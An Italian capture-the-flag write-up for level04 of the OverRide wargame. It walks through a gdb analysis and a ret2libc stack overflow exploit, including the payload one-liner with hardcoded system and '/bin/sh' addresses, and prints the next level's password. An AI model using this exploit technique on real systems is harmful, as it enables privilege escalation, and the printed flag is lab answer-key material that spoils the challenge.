# Level 04
Analizziamo le stringhe presenti nel binario:
```
level04@OverRide:~$ readelf -p '.rodata' level04

String dump of section '.rodata':
  [     8]  %u
  [     b]  Give me some shellcode, k
  [    25]  child is exiting...
  [    39]  no exec() for you
```
Analizziamo tramite `gdb`:
```
level04@OverRide:~$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804845c  _init
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt
0x08048510  __gmon_start__
0x08048510  __gmon_start__@plt
0x08048520  kill
0x08048520  kill@plt
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
0x08048540  prctl
0x08048540  prctl@plt
0x08048550  fork
0x08048550  fork@plt
0x08048560  __isoc99_scanf
0x08048560  __isoc99_scanf@plt
0x08048570  ptrace
0x08048570  ptrace@plt
0x08048580  _start
0x080485b0  __do_global_dtors_aux
0x08048610  frame_dummy
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
0x08048830  __libc_csu_init
0x080488a0  __libc_csu_fini
0x080488a2  __i686.get_pc_thunk.bx
0x080488b0  __do_global_ctors_aux
0x080488dc  _fini
```

### Funzione `main`
Viene avviato un processo figlio il quale richiede una stringa in input per poi
terminare la sua esecuzione. Mentre nel processo padre viene controllato se il
processo figlio è terminato e se è in esecuzione una funzione `exec` così da terminare
in modo forzato tramite `kill` il processo.

### Soluzione
Dato che non si può usare uno shellcode con `exec` allora useremo la tecnica `ret2libc`.
Troviamo l'offset per sovrascrivere l'`eip`:
```
level04@OverRide:~$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 2436]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2436]
0x41326641 in ?? ()
```
Abbiamo individuato l'offset a `156`, ora cerchiamo l'indirizzo della funzione `system`
e della stringa `/bin/sh`:
```
level04@OverRide:~$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) info proc map
process 2440
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
```
```
system:  0xf7e6aed0
/bin/sh: 0xf7f897ec
```
Mettendo un breakpoint nel punto in cui poi partirà la funzione `system` individuiamo
quale punto dello stack viene passato alla funzione, ovvero 4 byte dopo l'indirizzo,
quindi ora procediamo:
```
level04@OverRide:~$ python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "A"*4 + "\xec\x97\xf8\xf7"' > /tmp/exploit
level04@OverRide:~$ cat /tmp/exploit - | ./level04
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
^C
level04@OverRide:~$ su level05
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$
```
